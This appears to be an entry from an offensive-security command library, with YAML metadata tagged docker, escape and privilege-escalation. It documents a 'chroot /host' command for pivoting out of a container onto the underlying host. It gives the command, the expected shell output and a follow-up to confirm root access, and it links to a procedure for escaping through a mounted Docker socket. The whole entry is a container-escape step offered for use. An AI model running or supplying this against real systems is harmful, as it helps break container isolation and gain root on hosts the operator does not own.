---
type: command
executor: bash
data: |-
  chroot /host && clear
  echo 'You are now on the underlying host'
output: null
created_at: '2023-04-06T03:56:16.917276+00:00'
updated_at: '2023-04-10T20:33:49.704451+00:00'
platforms:
  - Linux
tags:
  - docker
  - escape
  - privilege-escalation
verified: true
validated: true
---

# perform-chroot-escape

## Command

```bash
chroot /host && clear
echo 'You are now on the underlying host'
```

## Description

Manually changes the root directory to the host filesystem (/host, typically mounted by escape tools) and confirms the pivot with a message, providing a clean host shell.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /host | Mounted host root path | Yes |

## Examples

### Basic Usage

```bash
chroot /host && clear
echo 'You are now on the underlying host'
```

## Expected Output

( Screen clears )
You are now on the underlying host
/ # 

Follow with id to confirm root.

## Related

- [[procedures/Escape-Container-Using-Mounted-Docker-Socket]]
